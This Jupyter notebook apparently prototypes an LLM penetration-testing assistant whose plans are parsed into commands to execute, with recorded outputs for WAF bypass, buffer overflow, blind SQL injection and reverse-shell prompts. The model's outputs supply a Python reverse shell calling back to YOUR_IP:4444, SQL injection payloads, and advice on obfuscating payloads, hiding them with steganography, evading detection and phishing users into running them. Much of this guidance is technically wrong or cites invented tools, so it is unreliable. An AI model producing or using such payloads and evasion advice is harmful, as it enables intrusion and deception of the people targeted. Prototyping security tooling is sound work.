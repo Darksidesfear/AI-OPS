{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "initial_id",
   "metadata": {
    "collapsed": true,
    "ExecuteTime": {
     "end_time": "2024-10-04T07:21:37.369809Z",
     "start_time": "2024-10-04T07:21:26.208808Z"
    }
   },
   "outputs": [],
   "source": [
    "from src.agent.llm import Ollama\n",
    "from src.agent.tools import TOOLS"
   ]
  },
  {
   "cell_type": "code",
   "outputs": [
    {
     "data": {
      "text/plain": "'gobuster, hashcat, Hydra, Nmap, searchsploit, sqlmap'"
     },
     "execution_count": 42,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "available_tools = ', '.join([tool.name for tool in TOOLS])\n",
    "available_tools"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-04T07:50:00.852714Z",
     "start_time": "2024-10-04T07:50:00.848216Z"
    }
   },
   "id": "29b60a8d7653819a",
   "execution_count": 42
  },
  {
   "cell_type": "code",
   "outputs": [],
   "source": [
    "system_prompt = \"\"\"As a proficient assistant in Penetration Testing, your task is to help an authorized user during a penetration testing assessment of a target system. \n",
    "The user will usually ask you how to do some task or he will tell you the results of some activity; you should always briefly expose your understanding of the required task, one or two sentences should be enough. \n",
    "When it is clear that you have a good understanding of the task you should propose possible solutions; a solutions should be paired with tools to perform it, however note that the user is most comfortable with the following tools: {tools}\n",
    "\n",
    "Guidelines:\n",
    "1. **Ask Questions** to understand the user's context or requirements.\n",
    "2. **Do not assume any specific context** such as operating system or network setup without asking the user first.\n",
    "3. **Tool Usage** provide example tool usage to solve the task, but let the user provide you the output.\n",
    "4. **Tool Priority** prefer using the tools the user is most comfortable with\"\"\".format(tools=available_tools)\n",
    "\n",
    "user_prompt = \"\"\"{user}\n",
    "\n",
    "Remember, to make sure the objective is clear you can ask questions.\n",
    "\"\"\""
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-04T08:02:46.559545Z",
     "start_time": "2024-10-04T08:02:46.556043Z"
    }
   },
   "id": "1db0957d2adfb98a",
   "execution_count": 58
  },
  {
   "cell_type": "code",
   "outputs": [],
   "source": [
    "conversion_system_prompt = \"\"\"Given a Penetration Testing plan in natural language you should detect the presence of commands to execute in the plan. Extract the commands from the plan and convert them into the provided JSON format.\n",
    "    [\n",
    "        {\"thought\": \"considerations on command execution\", \"command\": \"a single command\"}\n",
    "    ]\n",
    "\n",
    "**Detect Commands:**\n",
    "- Text that would be typed directly into a terminal to perform an action.\n",
    "- Often enclosed within code blocks like: ``` ... ```.\n",
    "- Is something that can be executed programmatically.\n",
    "\n",
    "IMPORTANT: \n",
    "1. If the plan doesn't contain any commands to execute provide an empty list [].\n",
    "\n",
    "\"\"\"\n",
    "\n",
    "conversion_user_prompt = \"\"\"Penetration Testing Plan:\n",
    "{plan}\n",
    "\n",
    "Command Extraction Guidelines:\n",
    "1. Only provide the JSON string\n",
    "2. Provide an empty list if there is nothing to execute.\n",
    "3. If a command contains a placeholder, such as <target>, the command is not valid.\n",
    "4. Accuracy is paramount. Any errors in the extracted commands could have significant consequences.\"\"\""
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-04T08:22:09.927235Z",
     "start_time": "2024-10-04T08:22:09.923235Z"
    }
   },
   "id": "36a1f9024dcc6a26",
   "execution_count": 90
  },
  {
   "cell_type": "code",
   "outputs": [],
   "source": [
    "model = Ollama(\n",
    "    model='mistral',\n",
    "    client_url='https://945f-35-204-90-181.ngrok-free.app/'\n",
    ")"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-04T08:22:10.673676Z",
     "start_time": "2024-10-04T08:22:10.347176Z"
    }
   },
   "id": "7c8e794601eb75c",
   "execution_count": 91
  },
  {
   "cell_type": "code",
   "outputs": [],
   "source": [
    "def chat(user_input: str):\n",
    "    yield from model.query([\n",
    "        {'role': 'system', 'content': system_prompt},\n",
    "        {'role': 'user', 'content': user_prompt.format(user=user_input)}\n",
    "    ])\n",
    "    \n",
    "def get_commands(nl_plan: str):\n",
    "    messages = [\n",
    "        {'role': 'system', 'content': conversion_system_prompt},\n",
    "        {'role': 'user', 'content': conversion_user_prompt.format(plan=nl_plan)}\n",
    "    ]\n",
    "    for ch in model.query(messages):\n",
    "        print(ch, end='')\n",
    "    print()"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-04T08:22:10.732677Z",
     "start_time": "2024-10-04T08:22:10.727677Z"
    }
   },
   "id": "40957f1c8b577212",
   "execution_count": 92
  },
  {
   "cell_type": "code",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " To help determine the most effective bypass technique for the identified Web Application Firewall (WAF), let's first gather some information about its specific rules or signatures. This will allow us to make an informed decision on the best approach to avoid detection.\n",
      "\n",
      "We can use tools like `ZAP` (Zed Attack Proxy) or `OWASP ModSecurity Rule Set Analyzer` to analyze the WAF's rules and gain insights into its common patterns, rules, and signatures. This analysis will help us identify potential vulnerabilities in the WAF that can be exploited using encoding techniques, different encodings, or modified request headers.\n",
      "\n",
      "Once we have a better understanding of the WAF's rules, we can proceed with testing each technique to determine which one has the highest chance of success for bypassing the WAF without detection.\n",
      "For example, you could use `urlencode` or `hexencode` for payload encoding, `burp-suite` for modifying request headers, and `BeEF` (Browser Exploitation Framework) for executing client-side scripts to bypass the WAF undetected.\n",
      " [\n",
      "        {\"thought\": \"commands for analyzing WAF rules\", \"command\": \"ZAP\"},\n",
      "        {\"thought\": \"commands for analyzing OWASP ModSecurity Rule Set\", \"command\": \"OWASP ModSecurity Rule Set Analyzer\"},\n",
      "        {\"thought\": \"commands for encoding payloads\", \"command\": \"urlencode\"},\n",
      "        {\"thought\": \"commands for encoding payloads\", \"command\": \"hexencode\"},\n",
      "        {\"thought\": \"command for modifying request headers\", \"command\": \"burp-suite\"},\n",
      "        {\"thought\": \"command for executing client-side scripts\", \"command\": \"BeEF\"}\n",
      "    ]\n"
     ]
    }
   ],
   "source": [
    "bypass_firewall = \"I need to bypass a WAF using a technique that avoids detection. I've identified a few possibilities like encoding the payload, using a different encoding, or modifying the request headers. However, I need to determine which technique has the highest chance of success for this particular WAF. Is there any way to identify its specific rules or signatures to make an informed decision?\"\n",
    "\n",
    "plan = ''\n",
    "for chunk in chat(bypass_firewall):\n",
    "    print(chunk, end='')\n",
    "    plan += chunk\n",
    "print()\n",
    "get_commands(plan)"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-04T08:22:23.209714Z",
     "start_time": "2024-10-04T08:22:11.141678Z"
    }
   },
   "id": "b0ad722fdab849d1",
   "execution_count": 93
  },
  {
   "cell_type": "code",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " To create a successful buffer overflow exploit for the 'system()' function on a 64-bit Linux system with specific glibc version, we need to understand the stack layout, function call conventions, and bypass ASLR (Address Space Layout Randomization) and DEP (Data Execution Prevention).\n",
      "\n",
      "First, let's gather information about the stack layout and function call conventions. We can use GDB (GNU Debugger) for this purpose:\n",
      "\n",
      "```bash\n",
      "gdb -q <target_binary>\n",
      "layout\n",
      "info register save\n",
      "info registers\n",
      "```\n",
      "\n",
      "Next, we'll need to determine the base address of glibc and other important libraries using ASLR bypass techniques. You can use tools like PIE-loader or pwndbg (a GDB extension) for this purpose:\n",
      "```bash\n",
      "pie-loader -f <target_binary>\n",
      "pwndbg -r <target_binary> --pid <process_id>\n",
      "```\n",
      "\n",
      "Now that we have the glibc base address, we can calculate the offset to reach the system() function by finding the position of the system() function in the glibc library and subtracting its address from the glibc base.\n",
      "\n",
      "To craft the exploit payload, we will use python or perl scripts with the 'p' format string to control the EIP register and achieve code execution:\n",
      "\n",
      "```bash\n",
      "python -c \"from pwn import *; p = process('<target_binary>'); p.sendline('A' * 100 + '\\xdeadbeef')\"\n",
      "```\n",
      "\n",
      "However, DEP is enabled by default on modern Linux systems, so we need to find a gadget that allows execution of arbitrary code within the buffer overflow area. You can use searchsploit or exploit-db to find exploits for similar vulnerabilities:\n",
      "\n",
      "```bash\n",
      "searchsploit <vulnerable_application_name>\n",
      "```\n",
      "\n",
      "Finally, compile and run your exploit script on a vulnerable system to achieve code execution.\n",
      " [\n",
      "        {\"thought\": \"commands for gathering information about stack layout and function call conventions\", \"command\": \"gdb -q <target_binary>\"},\n",
      "        {\"thought\": \"command to display the current layout\", \"command\": \"layout\"},\n",
      "        {\"thought\": \"commands to display register values\", \"command\": \"info register save\"},\n",
      "        {\"thought\": \"commands to display all registers\", \"command\": \"info registers\"},\n",
      "        {\"thought\": \"commands for determining base address of glibc and other important libraries using ASLR bypass techniques\", \"command\": \"pie-loader -f <target_binary>\"},\n",
      "        {\"thought\": \"command for running pwndbg with a specific process id\", \"command\": \"pwndbg -r <target_binary> --pid <process_id>\"},\n",
      "        {\"thought\": \"command to craft the exploit payload using python\", \"command\": \"python -c \\\"from pwn import *; p = process('<target_binary>'); p.sendline('A' * 100 + '\\xdeadbeef')\\\"\"},\n",
      "        {\"thought\": \"command for finding exploits for similar vulnerabilities\", \"command\": \"searchsploit <vulnerable_application_name>\"}\n",
      "    ]\n"
     ]
    }
   ],
   "source": [
    "binary_exploit = \"I need to create a custom exploit that targets a buffer overflow vulnerability in the 'system()' function of a Linux application. The application runs on a 64-bit system with a specific version of the glibc library. I need to understand the stack layout, function call conventions, and the exploit mitigations like ASLR and DEP implemented in this environment. Can you guide me on how to bypass these mitigations and achieve code execution?\"\n",
    "\n",
    "plan = ''\n",
    "for chunk in chat(binary_exploit):\n",
    "    print(chunk, end='')\n",
    "    plan += chunk\n",
    "print()\n",
    "get_commands(plan)"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-04T08:22:45.539875Z",
     "start_time": "2024-10-04T08:22:23.210713Z"
    }
   },
   "id": "fd9beed00c4cf93e",
   "execution_count": 94
  },
  {
   "cell_type": "code",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " To clarify, you've identified a blind SQL injection vulnerability in the login form of your web application, and you aim to extract the database schema and sensitive information without triggering any obvious errors or alerts. Here are some advanced SQL injection techniques and payloads that could help you achieve this goal:\n",
      "\n",
      "1. Time-based Blind SQL Injection (TBTI): By measuring the response time of the application, you can determine if a certain condition is true or false in the database. For example, you can craft a query like `' OR SLEEP(5) --` to delay the response by 5 seconds if the condition is true.\n",
      "\n",
      "2. Out-of-band Communication (OOB): If possible, establish an out-of-band channel for communication with the application. For example, you can use a subdomain takeover vulnerability or a misconfigured email server to receive responses from the application without triggering any errors on the login form.\n",
      "\n",
      "3. Error-based Blind SQL Injection (EBSQLI): By analyzing the error messages returned by the application, you can infer whether certain conditions are true or false in the database. For example, if the error message changes when the query is crafted as `' OR 1=1 --` and `' OR 1=2 --`, it suggests that the condition 1 = 1 is always true.\n",
      "\n",
      "To bypass potential security measures like input validation and error handling:\n",
      "\n",
      "1. Use encoding techniques (URL, hexadecimal, or base64) to obfuscate your SQL injection payloads.\n",
      "\n",
      "2. Craft queries using multiple injection points if possible, as it can help you bypass some filtering mechanisms.\n",
      "\n",
      "3. Exploit any known vulnerabilities in the web application framework or third-party libraries used by the application, which could allow you to execute arbitrary code or bypass security controls.\n",
      "\n",
      "4. If the application uses prepared statements, try to force it into using dynamic SQL by crafting queries that exceed the maximum length of a prepared statement or use syntax not supported in prepared statements.\n",
      " [\n",
      "        {\"thought\": \"commands for Time-based Blind SQL Injection (TBTI)\", \"command\": \"' OR SLEEP(5) --\"},\n",
      "        {\"thought\": \"commands for Out-of-band Communication\", \"command\": \"<subdomain_takeover_technique>\"},\n",
      "        {\"thought\": \"commands for Error-based Blind SQL Injection (EBSQLI)\", \"command\": \"' OR 1=1 --\"},\n",
      "        {\"thought\": \"commands using encoding techniques\", \"command\": \"<obfuscated_SQL_injection_payloads>\"}\n",
      "    ]\n"
     ]
    }
   ],
   "source": [
    "sql_injection_exploit =  \"I need to exploit a SQL injection vulnerability on the login form of this web application. I've identified the vulnerability using a blind SQL injection technique, but I need to craft a query to extract the database schema and sensitive information from the database. Can you provide me with some advanced SQL injection payloads to achieve this goal, and how can I bypass any potential security measures like input validation and error handling?\"\n",
    "\n",
    "plan = ''\n",
    "for chunk in chat(sql_injection_exploit):\n",
    "    print(chunk, end='')\n",
    "    plan += chunk\n",
    "print()\n",
    "get_commands(plan)"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-04T08:23:03.747065Z",
     "start_time": "2024-10-04T08:22:45.541382Z"
    }
   },
   "id": "5949277c3d384e58",
   "execution_count": 95
  },
  {
   "cell_type": "code",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " Understood that you've discovered a potential Remote Code Execution (RCE) vulnerability in a web application and you wish to create a reverse shell using Python, bypass security measures such as Web Application Firewalls (WAFs), remain undetected, and connect back to your machine on port 4444.\n",
      "\n",
      "To craft the reverse shell payload, we can use Python's netcat library (nc) or pyserial library. Here's an example of a simple Python reverse shell using netcat:\n",
      "\n",
      "```python\n",
      "import socket, subprocess, os\n",
      "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
      "s.connect('YOUR_IP', 4444)\n",
      "os.dup2(s.fileno(), 0)\n",
      "os.dup2(s.fileno(), 1)\n",
      "os.dup2(s.fileno(), 2)\n",
      "p = subprocess.call(['/bin/bash', '-i'])\n",
      "```\n",
      "\n",
      "To bypass security measures and ensure the payload remains undetected, you can:\n",
      "\n",
      "1. Encode or obfuscate the payload using tools like base64, python's built-in `quopri`, or online encoders such as Mischief (https://mischief.sh) and CyberChef (https://cyberchef.org).\n",
      "2. Use a steganography tool to hide the payload within an image or other file format, like Steghide (https://steghide.alioth.debian.org/) or InvisibleSecrets (https://www.invisiblsecrets.com/).\n",
      "3. Implement anti-analysis techniques such as polymorphism, string encryption, or using multiple payloads to avoid detection by static analysis tools like WAFs.\n",
      "\n",
      "As for other techniques to deliver the payload, you can:\n",
      "\n",
      "1. Inject the payload directly into the vulnerable web application through a specially crafted request (SQL injection, Cross-Site Scripting, etc.)\n",
      "2. Use social engineering tactics such as phishing emails or chat messages to trick users into downloading and executing the payload.\n",
      "3. Leverage other attack vectors like exploiting known vulnerabilities in software, misconfigurations, or weak passwords on the target system.\n",
      " [\n",
      "        {\"thought\": \"executing the reverse shell payload using netcat\", \"command\": \"python /path/to/the/script.py YOUR_IP 4444\"},\n",
      "        {\"thought\": \"encoding or obfuscating the payload using tools like base64\", \"command\": \"base64 -w 0 payload.py > encoded_payload.txt\"},\n",
      "        {\"thought\": \"hiding the payload within an image using Steghide\", \"command\": \"steghide --embed --coverimage cover.jpg --inputfile payload.txt --outputfile stegged_payload.jpg\"}\n",
      "    ]\n"
     ]
    }
   ],
   "source": [
    "reverse_shell = \"I've found a potential RCE vulnerability in a web application. How can I craft a reverse shell payload using Python that will execute on the server and connect back to my machine on port 4444? I need to bypass any security measures in place like WAFs and ensure the payload remains undetected. I'd also like to know what other techniques are available for delivering the payload, such as encoding or obfuscation.\"\n",
    "\n",
    "plan = ''\n",
    "for chunk in chat(reverse_shell):\n",
    "    print(chunk, end='')\n",
    "    plan += chunk\n",
    "print()\n",
    "get_commands(plan)"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-04T08:23:22.830346Z",
     "start_time": "2024-10-04T08:23:03.748565Z"
    }
   },
   "id": "18a19248ff9c1f8c",
   "execution_count": 96
  },
  {
   "cell_type": "code",
   "outputs": [],
   "source": [],
   "metadata": {
    "collapsed": false
   },
   "id": "3822a65ecba4328e"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
